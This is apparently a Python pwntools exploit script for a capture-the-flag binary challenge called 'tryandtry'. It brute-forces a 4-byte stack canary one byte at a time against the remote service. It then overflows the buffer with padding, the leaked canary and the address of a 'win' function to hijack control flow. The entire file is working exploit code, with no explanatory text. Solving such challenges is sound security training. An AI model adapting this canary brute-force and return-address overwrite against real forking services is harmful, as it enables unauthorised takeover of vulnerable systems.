from pwn import *

exe = ELF("./main")

context.binary = exe

HOST = "tryandtry.chall.bytethecookies.org"
PORT = 5157

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

WIN = pack(exe.symbols["win"])

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def bruteforce_canary(r):
    padding = b"a" * 64
    canary = b"\x00"

    while len(canary) < 4:
        for i in range(0x0, 0xff):
            if i == 0x0a:
                continue
            
            payload =  padding + canary + bytes({i})
            r.sendlineafter(b"Input: ", payload)
            print(payload)
            line = r.recvline()
            if "stack" not in line.decode():
                canary += bytes({i})
                print("LEAKED CANARY BYTE: ", canary)
                break
    
    print("CANARY IS: ", canary)
    return canary

def main():
    r = conn()

    canary = bruteforce_canary(r)
    r.sendlineafter(b"Input: ", b"a" * 64 + canary + b"a" * 12 + WIN)
    
    r.interactive()

if __name__ == "__main__":
    main()
